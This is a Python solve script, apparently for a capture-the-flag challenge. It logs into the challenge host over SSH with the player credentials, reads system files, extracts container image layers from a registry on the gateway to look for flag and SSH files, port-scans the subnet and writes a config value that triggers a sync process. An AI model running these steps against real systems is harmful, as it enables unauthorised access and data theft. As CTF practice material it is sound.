#!/usr/bin/env python3
import paramiko, time

HOST, PORT, USER, PW = "instance.ctf.tdho.st", 33039, "player", "reyalp"
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(HOST, port=PORT, username=USER, password=PW, timeout=10)
except Exception as e:
    print("CONNECT FAIL", e)
    raise SystemExit(1)

def cmd(c, t=20):
    i, o, e = ssh.exec_command(c, timeout=t)
    return (o.read() + e.read()).decode(errors="replace").encode("ascii", errors="replace").decode()

print("CONNECTED")
print(cmd("id; cat /entrypoint.sh 2>/dev/null; cat /opt/mc/server.properties 2>/dev/null"))

# strings on sync-loop - readable?
print("STRINGS sync-loop:")
print(cmd("strings /opt/mc/scripts/sync-loop.sh 2>&1"))
print(cmd("xxd /opt/mc/scripts/sync-loop.sh 2>&1 | head -30"))

# Extract ALL layers from prerelease with manifest list support
print("EXTRACT ALL:")
print(cmd(r"""python3 << 'PY'
import urllib.request, json, gzip, tarfile, io, socket, struct, os

def gw():
    with open('/proc/net/route') as f:
        next(f)
        for line in f:
            p=line.split()
            if p[1]=='00000000':
                return socket.inet_ntoa(struct.pack('<L', int(p[2],16)))

def get(url, headers=None, timeout=10):
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read(), dict(r.headers)

reg='http://'+gw()+':5000'
repo='images/stolen-schematics-game-server-prerelease'
tag='v2.5.39'

accepts = [
    'application/vnd.docker.distribution.manifest.v2+json',
    'application/vnd.docker.distribution.manifest.list.v2+json',
    'application/vnd.oci.image.manifest.v1+json',
    'application/vnd.oci.image.index.v1+json',
]
manifest = None
for acc in accepts:
    try:
        req = urllib.request.Request(f'{reg}/v2/{repo}/manifests/{tag}', headers={'Accept': acc})
        body, hdrs = get(req.get_full_url(), dict(req.header_items()))
        manifest = json.loads(body)
        print('MANIFEST TYPE', acc, 'keys', list(manifest.keys()))
        break
    except Exception as e:
        print('fail', acc, e)

if not manifest:
    raise SystemExit('no manifest')

manifests = []
if 'manifests' in manifest:
    for m in manifest['manifests']:
        d = m['digest']
        req = urllib.request.Request(f'{reg}/v2/{repo}/manifests/{d}', headers={'Accept':'application/vnd.docker.distribution.manifest.v2+json'})
        manifests.append(json.loads(get(req.get_full_url(), dict(req.header_items()))[0]))
else:
    manifests = [manifest]

for mi, m in enumerate(manifests):
    print('SUBMANIFEST', mi, 'layers', len(m.get('layers',[])))
    for layer in m.get('layers', []):
        digest = layer['digest']
        try:
            data = get(f'{reg}/v2/{repo}/blobs/{digest}', timeout=20)[0]
        except Exception as e:
            print('blob fail', digest[:30], e)
            continue
        print('layer', digest[:20], 'size', len(data))
        for raw in [data]:
            if data[:2]==b'\x1f\x8b':
                try: raw = gzip.decompress(data)
                except: pass
            try:
                tf = tarfile.open(fileobj=io.BytesIO(raw), mode='r:*')
            except Exception as e:
                print('tar fail', e)
                continue
            for mem in tf.getmembers():
                if not mem.isfile():
                    continue
                n = mem.name
                if 'opt/mc' in n or 'sync' in n or 'entry' in n or 'ssh' in n or 'flag' in n:
                    body = tf.extractfile(mem).read()
                    print('\nFILE', n, len(body))
                    print(body.decode(errors='replace')[:12000])
PY""", 90))

# network scan + try ssh to host with paramiko from remote
print("NETWORK:")
print(cmd(r"""python3 << 'PY'
import socket, struct
with open('/proc/net/route') as f:
    next(f)
    for line in f:
        p=line.split()
        if p[1]=='00000000':
            gw=socket.inet_ntoa(struct.pack('<L', int(p[2],16)))
subnet='.'.join(gw.split('.')[:3])
print('GW', gw, 'SUBNET', subnet)
for i in range(1,10):
    ip=f'{subnet}.{i}'
    for port in [22,80,8080,5000,25565]:
        s=socket.socket(); s.settimeout(0.2)
        if s.connect_ex((ip,port))==0:
            print('OPEN', ip, port)
        s.close()
PY"""))

# Try sync with correct format from sync-agent if we find it
print("SYNC TEST sync.trigger check:")
cmd('echo "talldwarf-sync-force=true" > /opt/mc/config/sync-request.conf')
time.sleep(12)
print(cmd("python3 -c \"import os; p='/proc/16/root/opt/mc/.sync/sync.trigger'; print(open(p).read() if os.path.exists(p) else 'no trigger')\""))
print(cmd("ls -la /opt/mc/config/"))

ssh.close()
